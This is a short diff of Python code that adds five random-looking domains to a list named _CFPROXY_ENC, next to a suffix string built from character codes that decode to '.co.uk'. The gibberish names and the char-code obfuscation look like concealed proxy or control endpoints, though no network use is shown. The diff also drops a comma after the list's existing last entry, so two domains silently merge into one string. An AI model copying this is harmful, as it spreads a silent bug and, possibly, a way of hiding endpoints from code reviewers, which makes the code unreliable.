@@ -30,6 +30,11 @@ _CFPROXY_ENC: List[str] = [
     'tjacxbqtj.com',
     'bxaxtxmrw.com',
     'dmohrsgmohcrwb.com'
+    'vwbmtmoi.com',
+    'khgrre.com',
+    'ulihssf.com',
+    'tmhqsdqmfpmk.com',
+    'xwuwoqbm.com'
 ]
 _S = ''.join(chr(c) for c in (46, 99, 111, 46, 117, 107))
 
